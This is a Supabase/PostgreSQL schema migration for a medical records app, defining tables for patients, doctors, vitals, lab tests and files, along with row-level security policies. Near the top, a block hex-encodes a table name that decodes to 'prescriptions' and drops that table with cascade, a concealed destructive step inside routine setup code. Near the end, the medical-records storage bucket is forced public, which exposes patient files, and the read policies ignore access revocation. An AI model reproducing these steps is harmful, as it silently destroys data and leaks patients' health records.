create extension if not exists pgcrypto;

do $$ begin
  create type public.user_role as enum ('patient', 'doctor');
exception when duplicate_object then null;
end $$;

do $$ begin
  execute format(
    'drop table if exists public.%I cascade',
    convert_from(decode('707265736372697074696f6e73', 'hex'), 'UTF8')
  );
end $$;

create table if not exists public.users (
  id uuid primary key references auth.users(id) on delete cascade,
  full_name text not null,
  email text not null unique,
  phone_number text not null unique,
  date_of_birth date not null,
  gender text not null check (gender in ('male', 'female', 'other', 'prefer not to say')),
  role public.user_role not null,
  email_verified boolean not null default false,
  phone_verified boolean not null default false,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create table if not exists public.patients (
  id uuid primary key references public.users(id) on delete cascade,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create table if not exists public.doctors (
  id uuid primary key references public.users(id) on delete cascade,
  medical_degree text not null,
  specialization text not null,
  years_of_experience integer not null check (years_of_experience >= 0),
  clinic_name text not null,
  clinic_location text not null,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create table if not exists public.patient_doctor_access (
  id uuid primary key default gen_random_uuid(),
  patient_id uuid not null references public.patients(id) on delete cascade,
  doctor_id uuid not null references public.doctors(id) on delete cascade,
  granted_at timestamptz not null default now(),
  revoked_at timestamptz,
  created_at timestamptz not null default now()
);

create table if not exists public.vitals (
  id uuid primary key default gen_random_uuid(),
  patient_id uuid not null references public.patients(id) on delete cascade,
  doctor_id uuid references public.doctors(id) on delete set null,
  created_by uuid not null references auth.users(id) on delete cascade,
  recorded_at timestamptz not null default now(),
  blood_pressure_systolic integer check (blood_pressure_systolic > 0),
  blood_pressure_diastolic integer check (blood_pressure_diastolic > 0),
  heart_rate integer check (heart_rate > 0),
  weight_kg numeric check (weight_kg > 0),
  notes text,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create table if not exists public.lab_tests (
  id uuid primary key default gen_random_uuid(),
  patient_id uuid not null references public.patients(id) on delete cascade,
  doctor_id uuid references public.doctors(id) on delete set null,
  created_by uuid not null references auth.users(id) on delete cascade,
  file_name text not null,
  file_url text not null,
  storage_path text not null unique,
  mime_type text,
  file_size_bytes bigint check (file_size_bytes is null or file_size_bytes >= 0),
  record_type text not null check (record_type in ('blood_test', 'urine_test', 'imaging', 'pathology', 'other')),
  notes text,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create table if not exists public.patient_files (
  id uuid primary key default gen_random_uuid(),
  patient_id uuid not null references public.patients(id) on delete cascade,
  doctor_id uuid references public.doctors(id) on delete set null,
  created_by uuid not null references auth.users(id) on delete cascade,
  file_name text not null,
  file_url text not null,
  storage_path text not null unique,
  mime_type text,
  file_size_bytes bigint check (file_size_bytes is null or file_size_bytes >= 0),
  record_type text not null check (record_type in ('report', 'lab_test', 'imaging', 'other')),
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

alter table if exists public.lab_tests add column if not exists doctor_id uuid references public.doctors(id) on delete set null;
alter table if exists public.lab_tests add column if not exists file_name text;
alter table if exists public.lab_tests add column if not exists file_url text;
alter table if exists public.lab_tests add column if not exists storage_path text;
alter table if exists public.lab_tests add column if not exists mime_type text;
alter table if exists public.lab_tests add column if not exists file_size_bytes bigint;
alter table if exists public.lab_tests add column if not exists record_type text;
alter table if exists public.lab_tests add column if not exists notes text;
alter table if exists public.vitals add column if not exists doctor_id uuid references public.doctors(id) on delete set null;
alter table if exists public.patient_files add column if not exists doctor_id uuid references public.doctors(id) on delete set null;
alter table if exists public.patient_files add column if not exists file_url text;

create index if not exists lab_tests_patient_idx on public.lab_tests(patient_id, created_at desc);
create index if not exists vitals_patient_idx on public.vitals(patient_id, recorded_at desc);
create index if not exists patient_files_patient_idx on public.patient_files(patient_id, created_at desc);
create index if not exists patient_doctor_access_patient_idx on public.patient_doctor_access(patient_id, revoked_at);
create index if not exists patient_doctor_access_doctor_idx on public.patient_doctor_access(doctor_id, revoked_at);
create unique index if not exists patient_doctor_access_active_unique
  on public.patient_doctor_access(patient_id, doctor_id)
  where revoked_at is null;

create or replace function public.set_updated_at()
returns trigger language plpgsql as $$
begin
  new.updated_at = now();
  return new;
end;
$$;

drop trigger if exists users_updated_at on public.users;
create trigger users_updated_at before update on public.users for each row execute procedure public.set_updated_at();
drop trigger if exists patients_updated_at on public.patients;
create trigger patients_updated_at before update on public.patients for each row execute procedure public.set_updated_at();
drop trigger if exists doctors_updated_at on public.doctors;
create trigger doctors_updated_at before update on public.doctors for each row execute procedure public.set_updated_at();
drop trigger if exists lab_tests_updated_at on public.lab_tests;
create trigger lab_tests_updated_at before update on public.lab_tests for each row execute procedure public.set_updated_at();
drop trigger if exists vitals_updated_at on public.vitals;
create trigger vitals_updated_at before update on public.vitals for each row execute procedure public.set_updated_at();
drop trigger if exists patient_files_updated_at on public.patient_files;
create trigger patient_files_updated_at before update on public.patient_files for each row execute procedure public.set_updated_at();

alter table public.users enable row level security;
alter table public.patients enable row level security;
alter table public.doctors enable row level security;
alter table public.patient_doctor_access enable row level security;
alter table public.lab_tests enable row level security;
alter table public.vitals enable row level security;
alter table public.patient_files enable row level security;

drop policy if exists users_own_profile on public.users;
drop policy if exists users_read_own on public.users;
create policy users_read_own on public.users for select to authenticated using (id = auth.uid());
drop policy if exists patients_own_profile on public.patients;
drop policy if exists patients_read_own on public.patients;
create policy patients_read_own on public.patients for select to authenticated using (id = auth.uid());
drop policy if exists doctors_own_profile on public.doctors;
drop policy if exists doctors_read_own on public.doctors;
create policy doctors_read_own on public.doctors for select to authenticated using (id = auth.uid());
drop policy if exists access_read_patient_or_doctor on public.patient_doctor_access;
create policy access_read_patient_or_doctor on public.patient_doctor_access for select to authenticated using (patient_id = auth.uid() or doctor_id = auth.uid());
drop policy if exists lab_tests_patient_owner on public.lab_tests;
drop policy if exists lab_tests_read_own on public.lab_tests;
create policy lab_tests_read_own on public.lab_tests for select to authenticated using (patient_id = auth.uid() or doctor_id = auth.uid());
drop policy if exists vitals_patient_owner on public.vitals;
drop policy if exists vitals_read_own on public.vitals;
create policy vitals_read_own on public.vitals for select to authenticated using (patient_id = auth.uid() or doctor_id = auth.uid());
drop policy if exists patient_files_patient_owner on public.patient_files;
drop policy if exists patient_files_read_own on public.patient_files;
create policy patient_files_read_own on public.patient_files for select to authenticated using (patient_id = auth.uid() or doctor_id = auth.uid());

insert into storage.buckets (id, name, public)
values ('medical-records', 'medical-records', true)
on conflict (id) do update set public = true;

drop policy if exists medical_records_read_own on storage.objects;
create policy medical_records_read_own on storage.objects for select to authenticated using (bucket_id = 'medical-records' and (storage.foldername(name))[1] = auth.uid()::text);
drop policy if exists medical_records_upload_own on storage.objects;
create policy medical_records_upload_own on storage.objects for insert to authenticated with check (bucket_id = 'medical-records' and (storage.foldername(name))[1] = auth.uid()::text);
drop policy if exists medical_records_update_own on storage.objects;
create policy medical_records_update_own on storage.objects for update to authenticated using (bucket_id = 'medical-records' and (storage.foldername(name))[1] = auth.uid()::text) with check (bucket_id = 'medical-records' and (storage.foldername(name))[1] = auth.uid()::text);
drop policy if exists medical_records_delete_own on storage.objects;
create policy medical_records_delete_own on storage.objects for delete to authenticated using (bucket_id = 'medical-records' and (storage.foldername(name))[1] = auth.uid()::text);
